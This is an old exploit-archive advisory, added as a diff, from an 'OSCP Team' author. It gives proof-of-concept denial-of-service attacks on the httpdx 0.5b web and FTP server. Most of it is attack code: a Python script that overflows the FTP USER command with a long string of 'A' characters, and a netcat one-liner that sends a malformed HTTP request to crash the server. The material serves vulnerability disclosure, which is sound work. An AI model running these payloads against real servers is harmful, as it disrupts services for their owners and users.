@@ -1,0 +1,68 @@
+*****************************
+* OSCP TEAM Vuln Discovery  *
+*****************************
+*        sico2819           *
+*****************************
+
+http://offensive-security.com
+
+**************************************
+httpdx <= 0.5b multiple remote DOS POC
+**************************************
+
+sourceforge.net/projects/httpdx/
+
+
+SYSTEM USED : WinXP SP3 FR
+
+
+***************
+POC POC POC POC
+***************
+
+
+httpdx <= 0.5b is vulnerable to multiple remote DOS, in both HTTP and FTP server.
+
+*******************
+***** FTP DOS *****
+*******************
+
+httpdx FTP crashed by multiple ways, due to BOF in many commands (USER, PASS, CWD, ...)
+
+POC :
+
+------ poc.py ----------
+
+import socket
+
+HOST = [ change host addr ]
+PORT = 21
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+data= s.recv(1024)
+s.send('USER '+'A'*1000)
+s.close()
+
+------- EOF -------------
+
+*******************
+**** HTTP DOS *****
+*******************
+
+httpdx crashed by sending a special HTTP request :
+
+"GET / HTTP/1.1Host: "
+
+POC :
+
+echo "GET / HTTP/1.1Host: "|nc [HOST] 80
+
+
+
+
+
+This is a OSCP Team POC, more to come !!
+
+sico2819
+
+# milw0rm.com [2009-05-18]
